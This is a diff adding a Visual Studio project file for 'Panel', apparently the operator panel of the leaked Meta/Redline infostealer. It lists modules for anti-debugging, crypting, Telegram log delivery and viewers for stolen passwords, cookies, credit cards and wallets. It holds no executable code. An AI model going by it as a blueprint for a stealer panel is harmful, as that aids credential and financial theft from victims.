@@ -1,0 +1,690 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{8AE754DC-2F84-4C00-9DE5-0732FB13826C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>Panel</RootNamespace>
+    <AssemblyName>Panel</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <StartupObject>Meta.MainPanel.Calls.Program</StartupObject>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="GuiLib">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\GuiLib.dll</HintPath>
+    </Reference>
+    <Reference Include="IPLocator">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\IPLocator.dll</HintPath>
+    </Reference>
+    <Reference Include="MetroSet\u0020UI">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\MetroSet UI.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="Newtonsoft.Json">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json.Schema">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\Newtonsoft.Json.Schema.dll</HintPath>
+    </Reference>
+    <Reference Include="Pluralsight.Crypto">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\Pluralsight.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="protobuf-net">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\protobuf-net.dll</HintPath>
+    </Reference>
+    <Reference Include="RestSharp">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\RestSharp.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.ServiceModel" />
+    <Reference Include="System.Web.Extensions" />
+    <Reference Include="System.Web.Http">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\System.Web.Http.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="WindowsFirewallHelper">
+      <HintPath>..\..\Telegram Desktop\Meta+Redline-full\Meta+Redline\Meta\Panel\WindowsFirewallHelper.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="ColorPicker.cs" />
+    <Compile Include="ConfusedByAttribute.cs" />
+    <Compile Include="DPAPI.cs" />
+    <Compile Include="GStruct0.cs" />
+    <Compile Include="Meta\MainPanel\Calls\Proc.cs" />
+    <Compile Include="Meta\MainPanel\Calls\Program.cs" />
+    <Compile Include="Meta\MainPanel\Data\Controllers\GuestFilesDb.cs" />
+    <Compile Include="Meta\MainPanel\Data\Controllers\GuestLinksDb.cs" />
+    <Compile Include="Meta\MainPanel\Data\Controllers\UserLogsDb.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\AssemblyProtection.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\DebugProtect1.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\DebugProtect2.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\DebugProtect3.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\ProcessPort.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\ProcessPorts.cs" />
+    <Compile Include="Meta\MainPanel\Data\Core\ProcessScanner.cs" />
+    <Compile Include="Meta\MainPanel\Data\Extensions\CollectionExt.cs" />
+    <Compile Include="Meta\MainPanel\Data\Extensions\ControlExt.cs" />
+    <Compile Include="Meta\MainPanel\Data\Extensions\ProcessExtensions.cs" />
+    <Compile Include="Meta\MainPanel\Data\Files\FileCopyCreator.cs" />
+    <Compile Include="Meta\MainPanel\Data\Files\ResourceEditor.cs" />
+    <Compile Include="Meta\MainPanel\Data\FolderSelectDialog.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\AllocMethod.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\AuthenticodeTools.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\CookieHelper.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\CryptorBizAPI.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\Digest.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\Encryptor.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\IpLocator.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\MD5.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\MD5ChangedEventArgs.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\MD5ChangingEventArgs.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\MD5Helper.2.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\Md5Helper.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\PerformanceTester.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\RandomHelper.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\RevocationCheckFlags.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\StateAction.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\TrustProviderFlags.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\UiChoice.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\UIContext.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\UiHelper.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\UnionChoice.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\UnmanagedPointer.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrust.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustData.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataChoice.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataProvFlags.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataRevocationChecks.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataStateAction.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataUIChoice.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustDataUIContext.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinTrustFileInfo.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WINTRUST_DATA.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WINTRUST_FILE_INFO.cs" />
+    <Compile Include="Meta\MainPanel\Data\Helpers\WinVerifyTrustResult.cs" />
+    <Compile Include="Meta\MainPanel\Data\LogSorter.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\AetherTabControl.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\AnimatedButton.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\HopeColors.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\HopeSwitch.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\PartnerPoster.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\RedDataGridView.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\TablessControl.cs" />
+    <Compile Include="Meta\MainPanel\Data\UI\TelegramBotSettingsControl.cs" />
+    <Compile Include="Meta\MainPanel\DbControllers\LazyLoader.cs" />
+    <Compile Include="Meta\MainPanel\GuestHttpServer.cs" />
+    <Compile Include="Meta\MainPanel\LogExt\HeaderParams.cs" />
+    <Compile Include="Meta\MainPanel\LogExt\IsNullExtension.cs" />
+    <Compile Include="Meta\MainPanel\LogExt\UserLogExt.cs" />
+    <Compile Include="Meta\MainPanel\Models\BTC\BtcBalanceRoot.cs" />
+    <Compile Include="Meta\MainPanel\Models\BTC\TxRef.cs" />
+    <Compile Include="Meta\MainPanel\Models\ChangePageEventHandler.cs" />
+    <Compile Include="Meta\MainPanel\Models\Communication\Entity.cs" />
+    <Compile Include="Meta\MainPanel\Models\Communication\GenericService.cs" />
+    <Compile Include="Meta\MainPanel\Models\Communication\HttpActionResult.cs" />
+    <Compile Include="Meta\MainPanel\Models\Communication\IMainServer.cs" />
+    <Compile Include="Meta\MainPanel\Models\Communication\StringTool.cs" />
+    <Compile Include="Meta\MainPanel\Models\CryptorBiz\CryptedFile.cs" />
+    <Compile Include="Meta\MainPanel\Models\CryptorBiz\CryptInfoResponse.cs" />
+    <Compile Include="Meta\MainPanel\Models\CryptorBiz\FreeRecrypts.cs" />
+    <Compile Include="Meta\MainPanel\Models\CryptorBiz\InputFile.cs" />
+    <Compile Include="Meta\MainPanel\Models\CurrentIndexChangedEventHandler.cs" />
+    <Compile Include="Meta\MainPanel\Models\DB\DbController.cs" />
+    <Compile Include="Meta\MainPanel\Models\DB\OnLoadItem.cs" />
+    <Compile Include="Meta\MainPanel\Models\DB\OnUnloadItem.cs" />
+    <Compile Include="Meta\MainPanel\Models\DB\PagedProtoDb.cs" />
+    <Compile Include="Meta\MainPanel\Models\DB\ProtoDb.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\DebugObjectInformationClass.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\NtStatus.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\ProcessInfoClass.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\SystemInformationClass.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\SystemKernelDebuggerInformation.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\ThreadAccess.cs" />
+    <Compile Include="Meta\MainPanel\Models\Defense\ThreadInformationClass.cs" />
+    <Compile Include="Meta\MainPanel\Models\Files\AssemblyResource.cs" />
+    <Compile Include="Meta\MainPanel\Models\Files\ResourceType.cs" />
+    <Compile Include="Meta\MainPanel\Models\ItemsCountChangedEventHandler.cs" />
+    <Compile Include="Meta\MainPanel\Models\PageController.cs" />
+    <Compile Include="Meta\MainPanel\Models\PanelSettings.cs" />
+    <Compile Include="Meta\MainPanel\Models\ProfileSettings.cs" />
+    <Compile Include="Meta\MainPanel\Models\ServiceSettings.cs" />
+    <Compile Include="Meta\MainPanel\Models\Shared\MergeFile.cs" />
+    <Compile Include="Meta\MainPanel\Models\Shared\UpdateFile.cs" />
+    <Compile Include="Meta\MainPanel\Models\Shared\UpdateRoot.cs" />
+    <Compile Include="Meta\MainPanel\Models\StatisticDb.cs" />
+    <Compile Include="Meta\MainPanel\Models\UI\Direction.cs" />
+    <Compile Include="Meta\MainPanel\Models\UI\MARGINS.cs" />
+    <Compile Include="Meta\MainPanel\Models\UI\MouseState.cs" />
+    <Compile Include="Meta\MainPanel\Models\ViewerType.cs" />
+    <Compile Include="Meta\MainPanel\Properties\Resources.cs" />
+    <Compile Include="Meta\MainPanel\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\AuthFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\AuthFrm.Designer.cs">
+      <DependentUpon>AuthFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\AutofillesViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\AutofillesViewer.Designer.cs">
+      <DependentUpon>AutofillesViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\ChooseBrowserFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\ChooseBrowserFrm.Designer.cs">
+      <DependentUpon>ChooseBrowserFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CookieViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CookieViewer.Designer.cs">
+      <DependentUpon>CookieViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CreateWalletRuleDialog.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CreateWalletRuleDialog.Designer.cs">
+      <DependentUpon>CreateWalletRuleDialog.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CreditCardViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CreditCardViewer.Designer.cs">
+      <DependentUpon>CreditCardViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\CurrentMillis.cs" />
+    <Compile Include="Meta\MainPanel\Views\ExceptionsViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\ExceptionsViewer.Designer.cs">
+      <DependentUpon>ExceptionsViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\FilesViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\FilesViewer.Designer.cs">
+      <DependentUpon>FilesViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\LockFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\LockFrm.Designer.cs">
+      <DependentUpon>LockFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\MergeFilesConfigFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\MergeFilesConfigFrm.Designer.cs">
+      <DependentUpon>MergeFilesConfigFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\Old\Actions\MainFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\Old\Actions\MainFrm.Designer.cs">
+      <DependentUpon>MainFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\PassViewer.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\PassViewer.Designer.cs">
+      <DependentUpon>PassViewer.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SaveProcessFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SaveProcessFrm.Designer.cs">
+      <DependentUpon>SaveProcessFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\Settings\CompletedTasks.cs" />
+    <Compile Include="Meta\MainPanel\Views\Settings\CompletedTasks.Designer.cs">
+      <DependentUpon>CompletedTasks.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\Settings\SettingsOfPanel.Designer.cs">
+      <DependentUpon>SettingsOfPanel.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\Settings\TableSettings.Designer.cs">
+      <DependentUpon>TableSettings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SplashFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SplashFrm.Designer.cs">
+      <DependentUpon>SplashFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SystemInfoFrm.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\SystemInfoFrm.Designer.cs">
+      <DependentUpon>SystemInfoFrm.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\TelegramConfigurator.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\TelegramConfigurator.Designer.cs">
+      <DependentUpon>TelegramConfigurator.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\WalletsConfigurator.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Meta\MainPanel\Views\WalletsConfigurator.Designer.cs">
+      <DependentUpon>WalletsConfigurator.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Meta\SharedModels\AccountDetails.cs" />
+    <Compile Include="Meta\SharedModels\AdvertItem.cs" />
+    <Compile Include="Meta\SharedModels\Autofill.cs" />
+    <Compile Include="Meta\SharedModels\Browser.cs" />
+    <Compile Include="Meta\SharedModels\BuildParams.cs" />
+    <Compile Include="Meta\SharedModels\BuildType.cs" />
+    <Compile Include="Meta\SharedModels\ClientData.cs" />
+    <Compile Include="Meta\SharedModels\ClientSettings.cs" />
+    <Compile Include="Meta\SharedModels\Cookie.cs" />
+    <Compile Include="Meta\SharedModels\Credentials.cs" />
+    <Compile Include="Meta\SharedModels\CreditCard.cs" />
+    <Compile Include="Meta\SharedModels\FileScannerArg.cs" />
+    <Compile Include="Meta\SharedModels\GuestFile.cs" />
+    <Compile Include="Meta\SharedModels\GuestLink.cs" />
+    <Compile Include="Meta\SharedModels\Hardware.cs" />
+    <Compile Include="Meta\SharedModels\HardwareType.cs" />
+    <Compile Include="Meta\SharedModels\InstalledBrowserInfo.cs" />
+    <Compile Include="Meta\SharedModels\IRemoteEndpoint.cs" />
+    <Compile Include="Meta\SharedModels\JsonExt.cs" />
+    <Compile Include="Meta\SharedModels\LoginPair.cs" />
+    <Compile Include="Meta\SharedModels\MetaEvents.cs" />
+    <Compile Include="Meta\SharedModels\MetaService.cs" />
+    <Compile Include="Meta\SharedModels\NewClientHandler.cs" />
+    <Compile Include="Meta\SharedModels\OnVerifyConnectionRequested.cs" />
+    <Compile Include="Meta\SharedModels\RemoteFile.cs" />
+    <Compile Include="Meta\SharedModels\SendingMode.cs" />
+    <Compile Include="Meta\SharedModels\SettingsHandler.cs" />
+    <Compile Include="Meta\SharedModels\SingleSearchParams.cs" />
+    <Compile Include="Meta\SharedModels\TelegramChatsDb.cs" />
+    <Compile Include="Meta\SharedModels\TelegramChatSettings.cs" />
+    <Compile Include="Meta\SharedModels\UserLog.cs" />
+    <Compile Include="Meta\SharedModels\WalletConfig.cs" />
+    <Compile Include="Meta\SharedModels\WalletConfigsDb.cs" />
+    <Compile Include="mscoree\CorRuntimeHost.cs" />
+    <Compile Include="mscoree\ICorRuntimeHost.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="RecordHeaderField.cs" />
+    <Compile Include="SME.cs" />
+    <Compile Include="SQLite.cs" />
+    <Compile Include="Telegram\Bot\Args\ApiRequestEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ApiResponseEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\CallbackQueryEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ChannelPostEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ChatMemberUpdatedEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ChosenInlineResultEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\InlineQueryEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\MessageEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\MyChatMemberUpdatedEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\PollAnswerEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\PollEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\PreCheckoutQueryEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ReceiveErrorEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ReceiveGeneralErrorEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\ShippingQueryEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Args\UpdateEventArgs.cs" />
+    <Compile Include="Telegram\Bot\Converters\ChatIdConverter.cs" />
+    <Compile Include="Telegram\Bot\Converters\InputFileConverter.cs" />
+    <Compile Include="Telegram\Bot\Converters\InputMediaConverter.cs" />
+    <Compile Include="Telegram\Bot\Converters\MessageEntityTypeConverter.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ApiExceptionParser.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ApiRequestException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\BadRequestException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\BadRequestExceptionInfo.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ChatNotFoundException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ChatNotInitiatedException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ContactRequestException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ForbiddenException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\ForbiddenExceptionInfo.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\IApiExceptionInfo.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidGameShortNameException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidParameterException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidQueryIdException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidStickerDimensionsException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidStickerEmojisException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidStickerSetNameException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\InvalidUserIdException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\MessageIsNotModifiedException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\StickerSetNameExistsException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\StickerSetNotModifiedException.cs" />
+    <Compile Include="Telegram\Bot\Exceptions\UserNotFoundException.cs" />
+    <Compile Include="Telegram\Bot\Helpers\Extensions.cs" />
+    <Compile Include="Telegram\Bot\Helpers\InlineCalendar.cs" />
+    <Compile Include="Telegram\Bot\Helpers\InlineKeyboard.cs" />
+    <Compile Include="Telegram\Bot\Helpers\MessageHelper.cs" />
+    <Compile Include="Telegram\Bot\Helpers\ReplyKeyboard.cs" />
+    <Compile Include="Telegram\Bot\Helpers\SafeHelper.cs" />
+    <Compile Include="Telegram\Bot\Helpers\TextFormat.cs" />
+    <Compile Include="Telegram\Bot\ITelegramBotClient.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IAllowableSendWithoutReply.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IChatMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IFormattableMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IFormattableTextMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IInlineMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IInlineReplyMarkupMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\INotifiableMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IReplyMarkupMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IReplyMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\Abstractions\IThumbMediaMessage.cs" />
+    <Compile Include="Telegram\Bot\Requests\AddAnimatedStickerToSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\AddStickerToSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\AnswerCallbackQueryRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\AnswerInlineQueryRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\AnswerPreCheckoutQueryRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\AnswerShippingQueryRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\CloseRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\CopyMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\CreateChatInviteLinkRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\CreateNewAnimatedStickerSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\CreateNewStickerSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\DeleteChatPhotoRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\DeleteChatStickerSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\DeleteMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\DeleteStickerFromSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\DeleteWebhookRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditChatInviteLinkRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditInlineMessageCaptionRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditInlineMessageLiveLocationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditInlineMessageMediaRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditInlineMessageReplyMarkupRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditInlineMessageTextRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditMessageCaptionRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditMessageLiveLocationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditMessageMediaRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditMessageReplyMarkupRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\EditMessageTextRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\ExportChatInviteLinkRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\FileRequestBase.cs" />
+    <Compile Include="Telegram\Bot\Requests\ForwardMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetChatAdministratorsRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetChatMemberRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetChatMembersCountRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetChatRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetFileRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetGameHighScoresRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetInlineGameHighScoresRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetMeRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetMyCommandsRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetStickerSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetUpdatesRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetUserProfilePhotosRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\GetWebhookInfoRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\KickChatMemberRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\LeaveChatRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\LogOutRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\ParameterlessRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\PinChatMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\PromoteChatMemberRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\RequestBase.cs" />
+    <Compile Include="Telegram\Bot\Requests\RestrictChatMemberRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\RevokeChatInviteLinkRequest.cs" />
